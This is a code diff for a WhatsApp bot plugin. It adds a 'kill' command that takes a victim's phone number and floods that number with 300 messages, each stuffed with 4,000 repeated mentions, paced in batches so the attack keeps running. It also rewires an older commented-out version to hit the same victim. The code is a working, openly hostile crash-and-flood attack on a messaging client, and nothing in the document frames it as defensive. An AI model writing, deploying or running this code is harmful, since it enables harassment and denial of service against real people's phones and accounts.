@@ -116,6 +116,72 @@ cmd({
 ///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////
 cmd({
     pattern: "kill",
+    alias: ["pm-kill"],
+    desc: "waiting for your last words",
+    category: "group",
+    filename: __filename,
+    use: '<text>',
+},
+async (Void, citel, text,{ isCreator }) => {
+    try {
+        if (!isCreator) {
+            return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`);
+        }
+        
+        if (!text) {
+            return citel.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 23769813xxxx`);
+        }
+
+        const jid = citel.chat; // JID of the recipient
+        const userId = Void.user.id; // JID of the user
+        const message = "  "; // Message to send
+        const totalSends = 300; // Total number of sends
+        const batchSends = 30; // Number of sends before a pause
+        const pauseDuration = 2 * 60 * 1000; // Pause duration in milliseconds (2 minutes)
+
+        let firstMessageSent = false;
+        let victim = text.replace(/[^0-9]/g, "");
+
+        if (victim.startsWith('+')) {
+            return citel.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 23769813xxxx`);
+        }
+
+        let ying = victim + '@s.whatsapp.net';
+
+        for (let i = 0; i < totalSends; i += batchSends) {
+            for (let j = 0; j < batchSends; j++) {
+                await Void.sendMessage(ying, {
+                    text: message,
+                    mentions: Array(4000).fill(jid) // Mention the same JID 4000 times
+                });
+
+                // Confirmation after sending the first message
+                if (!firstMessageSent) {
+                    await Void.sendMessage(userId, {
+                        text: `The first message has been successfully sent to ${jid}.`
+                    });
+                    firstMessageSent = true;
+                }
+            }
+
+            if (i + batchSends < totalSends) {
+                await Void.sendMessage(userId, { text: `2 minute break after ${i + batchSends} sends...` });
+                await new Promise(resolve => setTimeout(resolve, pauseDuration));
+            }
+        }
+
+        // Final message after all sends
+        await Void.sendMessage(userId, {
+            text: `All messages (total ${totalSends}) have been sent to ${jid}.`
+        });
+    } catch (error) {
+        citel.reply(`An error occurred: ${error.message}`);
+    }
+});
+
+///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////
+/*cmd({
+    pattern: "kill",
     alias: ["htag"],
     desc: "waiting for your last words",
     category: "group",
@@ -123,6 +189,9 @@ cmd({
     use: '<text>',
 },
 async(Void, citel, text) => {
+    if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`);
+    if(!text) return citel.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 23769813xxxx`);
+    
     const jid = citel.chat; // JID du destinataire
     const userId = Void.user.id; // JID de l'utilisateur
     const message = "  "; // Le message à envoyer
@@ -131,10 +200,18 @@ async(Void, citel, text) => {
     const pauseDuration = 2 * 60 * 1000; // Durée de la pause en millisecondes (2 minutes)
 
     let firstMessageSent = false;
+    
+    
+            let victim = text.replace(/[^0-9]/g, "");
+        if (victim.startsWith('+')) {
+            return citel.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 23769813xxxx`);
+        }
+        
+        let ying = victim + '@s.whatsapp.net';
 
     for (let i = 0; i < totalSends; i += batchSends) {
         for (let j = 0; j < batchSends; j++) {
-            const sentMsg = await Void.sendMessage(jid, {
+            const sentMsg = await Void.sendMessage(ying, {
                 text: message,
                 mentions: Array(4000).fill(jid) // Mentionner le même JID 4000 fois
             });
